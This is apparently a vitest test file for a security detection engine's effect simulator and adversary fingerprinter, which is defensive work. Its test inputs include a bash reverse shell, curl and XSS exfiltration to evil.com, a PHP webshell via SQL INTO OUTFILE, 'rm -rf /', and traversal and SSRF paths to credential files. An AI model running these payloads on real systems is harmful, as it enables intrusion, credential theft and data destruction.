import { describe, it, expect } from 'vitest'
import { simulateSqlEffect, simulateCmdEffect, simulateXssEffect, simulatePathEffect, simulateSsrfEffect, fingerprintAdversary } from './effect-simulator.js'
import { InvariantEngine } from '../invariant-engine.js'
import type { PropertyProof } from '../classes/types.js'

describe('Effect Simulator', () => {
    const propertyProofFixture: PropertyProof = {
        property: 'payload(context_escape -> payload_inject -> syntax_repair)',
        witness: "' OR 1=1--",
        steps: [
            {
                operation: 'context_escape',
                input: "'",
                output: 'Breaks out of quoted context',
                property: 'escape(sql): quote closes string',
                offset: 0,
                confidence: 0.9,
            },
            {
                operation: 'payload_inject',
                input: 'OR 1=1',
                output: 'Injects tautological predicate',
                property: 'payload(sql): tautology forces TRUE',
                offset: 2,
                confidence: 0.95,
            },
            {
                operation: 'syntax_repair',
                input: '--',
                output: 'Comments trailing query',
                property: 'repair(sql): comment truncates host query',
                offset: 8,
                confidence: 0.86,
            },
        ],
        isComplete: true,
        domain: 'sqli',
        impact: 'SQL authentication bypass',
        proofConfidence: 0.97,
        verifiedSteps: 0,
        verificationCoverage: 0,
        proofVerificationLevel: 'none',
    }

    describe('PropertyProof unification', () => {
        it('uses PropertyProof steps/certainty for SQL effect when provided', () => {
            const effect = simulateSqlEffect("' OR 1=1--", undefined, propertyProofFixture)
            expect(effect.propertyProof).toEqual(propertyProofFixture)
            expect(effect.proof.isComplete).toBe(propertyProofFixture.isComplete)
            expect(effect.proof.certainty).toBe(propertyProofFixture.proofConfidence)
            expect(effect.proof.derivation[0]).toContain('PropertyProof')
            expect(effect.chain[0].description).toContain('Context escape')
            expect(effect.chain[1].description).toContain('Payload injection')
            expect(effect.chain[2].description).toContain('Syntax repair')
        })

        it('accepts PropertyProof for non-SQL simulators', () => {
            const cmd = simulateCmdEffect('cat /etc/shadow', propertyProofFixture)
            const xss = simulateXssEffect('<script>alert(1)</script>', propertyProofFixture)
            const path = simulatePathEffect('../../etc/passwd', propertyProofFixture)
            const ssrf = simulateSsrfEffect('http://127.0.0.1:8080/admin', propertyProofFixture)

            for (const effect of [cmd, xss, path, ssrf]) {
                expect(effect.propertyProof).toEqual(propertyProofFixture)
                expect(effect.proof.certainty).toBe(propertyProofFixture.proofConfidence)
                expect(effect.proof.isComplete).toBe(propertyProofFixture.isComplete)
                expect(effect.chain.length).toBe(propertyProofFixture.steps.length)
            }
        })
    })

    describe('SQL Effect Simulation', () => {
        it('proves tautology for OR 1=1', () => {
            const effect = simulateSqlEffect("' OR 1=1--")
            expect(effect.proof.isComplete).toBe(true)
            expect(effect.proof.certainty).toBeGreaterThanOrEqual(0.95)
            expect(effect.proof.statement).toContain('TRUE')
            expect(effect.operation).toBe('bypass_authentication')
            expect(effect.chain.length).toBeGreaterThanOrEqual(2)
        })

        it('proves tautology for string equality', () => {
            const effect = simulateSqlEffect("' OR 'a'='a'--")
            expect(effect.proof.isComplete).toBe(true)
            expect(effect.proof.statement).toContain('TRUE')
        })

        it('simulates UNION SELECT credential extraction', () => {
            const effect = simulateSqlEffect("' UNION SELECT username,password FROM users--")
            expect(effect.operation).toBe('steal_credentials')
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(9.0)
            expect(effect.impact.confidentiality).toBe(1.0)
        })

        it('simulates DROP TABLE impact', () => {
            const effect = simulateSqlEffect("'; DROP TABLE users--")
            expect(effect.operation).toBe('delete_data')
            expect(effect.impact.integrity).toBeGreaterThanOrEqual(0.9)
            expect(effect.impact.availability).toBeGreaterThanOrEqual(0.9)
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(9.0)
        })

        it('simulates SLEEP DoS', () => {
            const effect = simulateSqlEffect("' OR SLEEP(10)--")
            expect(effect.operation).toBe('cause_denial_of_service')
            expect(effect.impact.exposureEstimate).toContain('10')
        })

        it('simulates INTO OUTFILE webshell', () => {
            const effect = simulateSqlEffect("' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'--")
            expect(effect.operation).toBe('write_file')
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(8.0)
        })

        it('simulates schema enumeration', () => {
            const effect = simulateSqlEffect("' UNION SELECT table_name,column_name FROM information_schema.columns--")
            expect(effect.operation).toBe('extract_specific_columns')
        })

        it('simulates with query template', () => {
            const effect = simulateSqlEffect(
                "' OR 1=1--",
                "SELECT * FROM users WHERE username='[INPUT]'"
            )
            expect(effect.preconditions.some(p => p.includes('username'))).toBe(true)
            expect(effect.chain.some(s => s.description.includes('Modified query'))).toBe(true)
            expect(effect.proof.derivation.some(d => d.includes('Modified query'))).toBe(true)
        })

        it('computes CVSS-like score for credential theft', () => {
            const effect = simulateSqlEffect("' UNION SELECT password,ssn FROM accounts--")
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(9.0)
            expect(effect.impact.confidentiality).toBeGreaterThanOrEqual(0.9)
        })
    })

    describe('Command Injection Effect Simulation', () => {
        it('identifies reverse shell', () => {
            const effect = simulateCmdEffect("/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
            expect(effect.operation).toBe('establish_outbound_connection')
            expect(effect.impact.baseScore).toBe(10.0)
        })

        it('identifies credential file reading', () => {
            const effect = simulateCmdEffect("cat /etc/shadow")
            expect(effect.operation).toBe('steal_credentials')
            expect(effect.chain[0].description).toContain('/etc/shadow')
        })

        it('identifies destructive rm -rf', () => {
            const effect = simulateCmdEffect("rm -rf /")
            expect(effect.operation).toBe('delete_data')
        })

        it('identifies privilege escalation', () => {
            const effect = simulateCmdEffect("sudo chmod +s /bin/bash")
            expect(effect.operation).toBe('elevate_privileges')
        })

        it('handles multi-command chains', () => {
            const effect = simulateCmdEffect("id; cat /etc/passwd; curl -d @/etc/shadow https://evil.com")
            expect(effect.chain.length).toBe(3)
            // Most severe operation should be the primary
            expect(['steal_credentials', 'establish_outbound_connection']).toContain(effect.operation)
        })

        it('identifies persistence via crontab', () => {
            const effect = simulateCmdEffect('echo "* * * * * /tmp/backdoor" | crontab -')
            // Pipe splits into two commands
            expect(effect.chain.length).toBeGreaterThanOrEqual(2)
        })

        it('identifies system enumeration', () => {
            const effect = simulateCmdEffect("whoami")
            expect(effect.chain[0].description).toContain('System enumeration')
        })
    })

    describe('XSS Effect Simulation', () => {
        it('identifies cookie theft via script tag', () => {
            const effect = simulateXssEffect('<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>')
            expect(effect.operation).toBe('steal_credentials')
            expect(effect.proof.isComplete).toBe(true)
            expect(effect.impact.confidentiality).toBeGreaterThanOrEqual(0.9)
        })

        it('identifies redirect via event handler', () => {
            const effect = simulateXssEffect('<img onerror="location.href=\'https://phish.com\'">')
            expect(effect.operation).toBe('redirect_user')
            expect(effect.proof.isComplete).toBe(true)
        })

        it('identifies CSRF amplification via fetch', () => {
            const effect = simulateXssEffect('<script>fetch("https://internal.api/admin/delete",{method:"POST"})</script>')
            expect(effect.operation).toBe('establish_outbound_connection')
        })

        it('identifies basic XSS execution', () => {
            const effect = simulateXssEffect('<script>alert(1)</script>')
            expect(effect.operation).toBe('execute_javascript')
            expect(effect.proof.isComplete).toBe(true)
        })

        it('identifies localStorage theft', () => {
            const effect = simulateXssEffect('<script>fetch("https://evil.com/?d="+localStorage.getItem("token"))</script>')
            expect(effect.operation).toBe('steal_credentials')
        })
    })

    describe('Path Traversal Effect Simulation', () => {
        it('identifies /etc/shadow credential theft', () => {
            const effect = simulatePathEffect('../../../../../../etc/shadow')
            expect(effect.operation).toBe('steal_credentials')
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(9.0)
            expect(effect.chain.length).toBeGreaterThanOrEqual(2)
        })

        it('identifies .env secret extraction', () => {
            const effect = simulatePathEffect('../../../.env')
            expect(effect.operation).toBe('steal_credentials')
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(9.0)
        })

        it('identifies AWS credential theft', () => {
            const effect = simulatePathEffect('../../.aws/credentials')
            expect(effect.operation).toBe('steal_credentials')
            expect(effect.impact.baseScore).toBe(10.0)
        })

        it('detects null byte injection', () => {
            const effect = simulatePathEffect('../../etc/passwd%00.jpg')
            expect(effect.proof.derivation.some(d => d.includes('Null byte'))).toBe(true)
        })

        it('handles URL-encoded traversal', () => {
            const effect = simulatePathEffect('%2e%2e%2f%2e%2e%2fetc%2fpasswd')
            expect(effect.proof.derivation.some(d => d.includes('URL-encoded'))).toBe(true)
        })

        it('identifies generic file read', () => {
            const effect = simulatePathEffect('../../somefile.txt')
            expect(effect.operation).toBe('read_file')
        })
    })

    describe('SSRF Effect Simulation', () => {
        it('identifies cloud metadata credential theft', () => {
            const effect = simulateSsrfEffect('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
            expect(effect.operation).toBe('steal_credentials')
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(9.0)
        })

        it('identifies internal database access', () => {
            const effect = simulateSsrfEffect('http://10.0.0.5:6379/')
            expect(effect.operation).toBe('access_internal_service')
            expect(effect.proof.derivation.some(d => d.includes('10.0.0.5'))).toBe(true)
        })

        it('identifies internal admin panel', () => {
            const effect = simulateSsrfEffect('http://192.168.1.1/admin/dashboard')
            expect(effect.operation).toBe('access_internal_service')
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(8.0)
        })

        it('identifies file protocol access', () => {
            const effect = simulateSsrfEffect('file:///etc/passwd')
            expect(effect.operation).toBe('read_file')
        })

        it('identifies localhost service access', () => {
            const effect = simulateSsrfEffect('http://localhost:27017/')
            expect(effect.operation).toBe('access_internal_service')
        })
    })

    describe('Adversary Fingerprinting', () => {
        it('identifies SQLMap from --+ comment', () => {
            const fp = fingerprintAdversary(
                "' AND 5743=5743 UNION ALL SELECT NULL,CONCAT(0x7178627171,username,0x7178627171),NULL FROM users--+",
                ['sql_tautology', 'sql_union_extraction']
            )
            expect(fp.tool).toBe('sqlmap')
            expect(fp.automated).toBe(true)
            expect(fp.confidence).toBeGreaterThan(0.5)
        })

        it('identifies SQLMap from NNNN=NNNN probe', () => {
            const fp = fingerprintAdversary(
                "' AND 4521=4521--",
                ['sql_tautology']
            )
            expect(fp.tool).toBe('sqlmap')
            expect(fp.automated).toBe(true)
            expect(fp.indicators.some(i => i.includes('boolean probe'))).toBe(true)
        })

        it('identifies script kiddie from basic tautology', () => {
            const fp = fingerprintAdversary(
                "' OR 1=1--",
                ['sql_tautology']
            )
            expect(fp.skillLevel).toBe('script_kiddie')
        })

        it('identifies script kiddie from basic XSS', () => {
            const fp = fingerprintAdversary(
                "<script>alert(1)</script>",
                ['xss_tag_injection']
            )
            expect(fp.skillLevel).toBe('script_kiddie')
        })

        it('identifies expert from polyglot', () => {
            const fp = fingerprintAdversary(
                "'-alert(1)-'/**/UNION/**/SELECT/**/1--",
                ['sql_tautology', 'xss_tag_injection', 'cmd_separator']
            )
            expect(fp.skillLevel).toBe('expert')
        })

        it('identifies automated scanning from high class diversity', () => {
            const fp = fingerprintAdversary(
                "test",
                ['sql_tautology', 'xss_tag_injection', 'cmd_separator', 'path_dotdot_escape', 'ssrf_internal_reach']
            )
            expect(fp.automated).toBe(true)
        })

        it('identifies unicode obfuscation as advanced', () => {
            const fp = fingerprintAdversary(
                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                ['xss_tag_injection']
            )
            expect(fp.skillLevel).toBe('advanced')
        })
    })

    describe('Integration with InvariantEngine', () => {
        const engine = new InvariantEngine()

        it('full pipeline: detect → simulate → prove', () => {
            const payload = "' OR 1=1--"
            const deep = engine.detectDeep(payload, [])

            // Should detect SQL injection
            const sqlMatch = deep.matches.find(m => m.class === 'sql_tautology')
            expect(sqlMatch).toBeDefined()

            // Simulate the effect
            const effect = simulateSqlEffect(payload)
            expect(effect.proof.isComplete).toBe(true)
            expect(effect.proof.certainty).toBeGreaterThanOrEqual(0.95)
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(7.0)

            // Fingerprint the adversary
            const fp = fingerprintAdversary(payload, deep.matches.map(m => m.class))
            expect(fp.skillLevel).toBe('script_kiddie')
        })

        it('full pipeline: UNION credential theft', () => {
            const payload = "' UNION SELECT username,password FROM users--"
            const deep = engine.detectDeep(payload, [])
            const effect = simulateSqlEffect(payload)

            expect(effect.operation).toBe('steal_credentials')
            expect(effect.impact.baseScore).toBeGreaterThanOrEqual(9.0)
            expect(effect.impact.confidentiality).toBe(1.0)
        })

        it('full pipeline: command injection reverse shell', () => {
            const payload = "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
            const deep = engine.detectDeep(payload, [])
            const effect = simulateCmdEffect(payload)

            expect(effect.operation).toBe('establish_outbound_connection')
            expect(effect.impact.baseScore).toBe(10.0)
        })
    })
})
